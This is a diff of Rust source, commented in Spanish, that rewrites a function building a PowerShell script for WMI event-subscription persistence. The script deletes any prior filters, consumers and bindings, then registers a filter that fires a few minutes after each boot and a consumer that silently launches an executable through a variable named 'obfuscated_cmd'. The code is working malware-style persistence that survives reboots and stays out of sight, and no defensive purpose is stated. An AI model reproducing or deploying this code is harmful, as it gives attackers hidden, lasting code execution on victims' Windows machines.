@@ -419,14 +419,54 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     let obfuscated_cmd = format!("cmd.exe /c start /min \"\" \"{}\"", exe_str);
     
     // WMI Event que se dispara poco después del inicio del sistema
-    // Usamos Win32_ComputerSystem con un WITHIN corto (60 segundos) para detectar
-    // cuando el sistema está listo. El evento se dispara una vez por sesión.
+    // Usamos Win32_PerfFormattedData_PerfOS_System.SystemUpTime para detectar
+    // cuando el sistema lleva entre 60-300 segundos arriba (1-5 minutos después del boot).
+    // El WITHIN 60 significa que WMI verifica la condición cada 60 segundos.
     // 
-    // CORREGIDO: No usar Hour = 12 que solo funciona al mediodía
-    // En su lugar, detectamos cuando Win32_OperatingSystem LastBootUpTime cambia,
-    // lo cual ocurre después de cada reinicio.
+    // CORREGIDO: No usar Hour = 12 que solo funcionaba al mediodía
+    // Ahora detectamos el boot observando SystemUpTime en el rango correcto.
+    
+    // PowerShell script para crear WMI Event Subscription
+    // Primero limpia subscripciones existentes con el mismo nombre, luego crea nuevas
     let ps_script = format!(
-        r#"$FilterName = '{}'; $ConsumerName = '{}'; $ExePath = '{}'; try {{ $existing = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$FilterName'" -ErrorAction SilentlyContinue; if ($existing) {{ $existing | Remove-WmiObject -ErrorAction SilentlyContinue }}; $existingC = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'" -ErrorAction SilentlyContinue; if ($existingC) {{ $existingC | Remove-WmiObject -ErrorAction SilentlyContinue }}; $existingB = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object {{ $_.Filter -like "*$FilterName*" }}; if ($existingB) {{ $existingB | Remove-WmiObject -ErrorAction SilentlyContinue }} }} catch {{}}; $Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime <= 300'; $Filter = ([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance(); $Filter.Name = $FilterName; $Filter.EventNamespace = 'root\cimv2'; $Filter.QueryLanguage = 'WQL'; $Filter.Query = $Query; $Filter.Put() | Out-Null; $Consumer = ([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance(); $Consumer.Name = $ConsumerName; $Consumer.CommandLineTemplate = $ExePath; $Consumer.Put() | Out-Null; $Binding = ([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance(); $Binding.Filter = $Filter; $Binding.Consumer = $Consumer; $Binding.Put() | Out-Null"#,
+        concat!(
+            // Variables
+            "$FilterName = '{}'; ",
+            "$ConsumerName = '{}'; ",
+            "$ExePath = '{}'; ",
+            // Limpiar existentes
+            "try {{ ",
+                "$existing = Get-WmiObject -Namespace root\\subscription -Class __EventFilter ",
+                    "-Filter \"Name='$FilterName'\" -ErrorAction SilentlyContinue; ",
+                "if ($existing) {{ $existing | Remove-WmiObject -ErrorAction SilentlyContinue }}; ",
+                "$existingC = Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer ",
+                    "-Filter \"Name='$ConsumerName'\" -ErrorAction SilentlyContinue; ",
+                "if ($existingC) {{ $existingC | Remove-WmiObject -ErrorAction SilentlyContinue }}; ",
+                "$existingB = Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding ",
+                    "-ErrorAction SilentlyContinue | Where-Object {{ $_.Filter -like \"*$FilterName*\" }}; ",
+                "if ($existingB) {{ $existingB | Remove-WmiObject -ErrorAction SilentlyContinue }} ",
+            "}} catch {{}}; ",
+            // Crear Event Filter - dispara cuando SystemUpTime está entre 60-300 segundos
+            "$Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 ",
+                "WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' ",
+                "AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime <= 300'; ",
+            "$Filter = ([wmiclass]'\\\\.\\root\\subscription:__EventFilter').CreateInstance(); ",
+            "$Filter.Name = $FilterName; ",
+            "$Filter.EventNamespace = 'root\\cimv2'; ",
+            "$Filter.QueryLanguage = 'WQL'; ",
+            "$Filter.Query = $Query; ",
+            "$Filter.Put() | Out-Null; ",
+            // Crear Consumer - ejecuta el comando
+            "$Consumer = ([wmiclass]'\\\\.\\root\\subscription:CommandLineEventConsumer').CreateInstance(); ",
+            "$Consumer.Name = $ConsumerName; ",
+            "$Consumer.CommandLineTemplate = $ExePath; ",
+            "$Consumer.Put() | Out-Null; ",
+            // Crear Binding - conecta filter con consumer
+            "$Binding = ([wmiclass]'\\\\.\\root\\subscription:__FilterToConsumerBinding').CreateInstance(); ",
+            "$Binding.Filter = $Filter; ",
+            "$Binding.Consumer = $Consumer; ",
+            "$Binding.Put() | Out-Null"
+        ),
         event_name, event_name, obfuscated_cmd
     );
     
